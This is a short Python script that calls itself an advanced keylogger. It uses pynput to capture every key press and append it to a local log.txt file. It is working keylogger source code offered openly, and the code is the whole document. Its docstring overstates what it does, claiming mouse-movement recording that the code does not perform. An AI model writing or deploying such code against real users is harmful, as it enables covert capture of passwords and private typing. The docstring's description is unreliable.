'''
This is an advanced keylogger programmed written in Python3 designed to record keystrokes mouse cursor movement.
'''

from  pynput.keyboard import Listener

# Record keystrokes and place in txt file
# Listener - records keystrokes

# "with" keyword - releases memory/resources automatically

def writetofile(key):
    letter = str(key)
    letter = letter.replace("'","")
    with open("log.txt", "a") as txt_file:
        txt_file.write(letter)

with Listener(on_press = writetofile) as L:
    L.join()
